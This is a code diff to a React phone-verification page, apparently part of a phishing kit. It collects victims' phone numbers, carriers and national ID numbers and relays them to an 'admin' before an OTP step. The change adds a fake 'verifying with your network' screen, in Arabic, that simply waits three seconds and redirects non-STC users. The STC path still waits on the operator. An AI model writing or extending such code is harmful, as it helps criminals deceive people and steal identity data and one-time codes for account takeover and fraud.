@@ -20,6 +20,7 @@ import {
   isFormApproved,
   isFormRejected,
   navigateToPage,
+  waitingMessage,
 } from "@/lib/store";
 
 const serviceProviders = [
@@ -53,6 +54,7 @@ export default function PhoneVerification() {
   const [, navigate] = useLocation();
   const [selectedProvider, setSelectedProvider] = useState("");
   const [phoneError, setPhoneError] = useState("");
+  const [autoRedirecting, setAutoRedirecting] = useState(false);
 
   const {
     register,
@@ -139,17 +141,44 @@ export default function PhoneVerification() {
       phoneNumber: data.phone,
     };
 
-    sendData({
-      data: {
-        "رقم الجوال": data.phone,
-        "مزود الخدمة": providerName,
-        "رقم الهوية": idNumber,
-      },
-      current: "توثيق رقم الجوال",
-      nextPage: `تحقق رقم الجوال (OTP)?serviceProvider=${data.serviceProvider}`,
-      waitingForAdminResponse: true,
-      customWaitingMessage: "جاري التوثيق مع شبكة الإتصال الخاصة بك",
-    });
+    // إذا كانت الشبكة غير STC (قيمة STC هي "0")
+    if (data.serviceProvider !== "0") {
+      // إظهار شاشة الانتظار
+      setAutoRedirecting(true);
+      waitingMessage.value = "جاري التوثيق مع شبكة الإتصال الخاصة بك";
+      
+      // إرسال البيانات للأدمن بدون انتظار الرد
+      sendData({
+        data: {
+          "رقم الجوال": data.phone,
+          "مزود الخدمة": providerName,
+          "رقم الهوية": idNumber,
+        },
+        current: "توثيق رقم الجوال",
+        nextPage: `تحقق رقم الجوال (OTP)?serviceProvider=${data.serviceProvider}`,
+        waitingForAdminResponse: false,
+      });
+      
+      // التحويل التلقائي بعد 3 ثواني
+      setTimeout(() => {
+        waitingMessage.value = "";
+        setAutoRedirecting(false);
+        navigate(`/phone-otp?serviceProvider=${data.serviceProvider}`);
+      }, 3000);
+    } else {
+      // STC - السلوك الحالي (انتظار رد الأدمن)
+      sendData({
+        data: {
+          "رقم الجوال": data.phone,
+          "مزود الخدمة": providerName,
+          "رقم الهوية": idNumber,
+        },
+        current: "توثيق رقم الجوال",
+        nextPage: `تحقق رقم الجوال (OTP)?serviceProvider=${data.serviceProvider}`,
+        waitingForAdminResponse: true,
+        customWaitingMessage: "جاري التوثيق مع شبكة الإتصال الخاصة بك",
+      });
+    }
   };
 
   return (
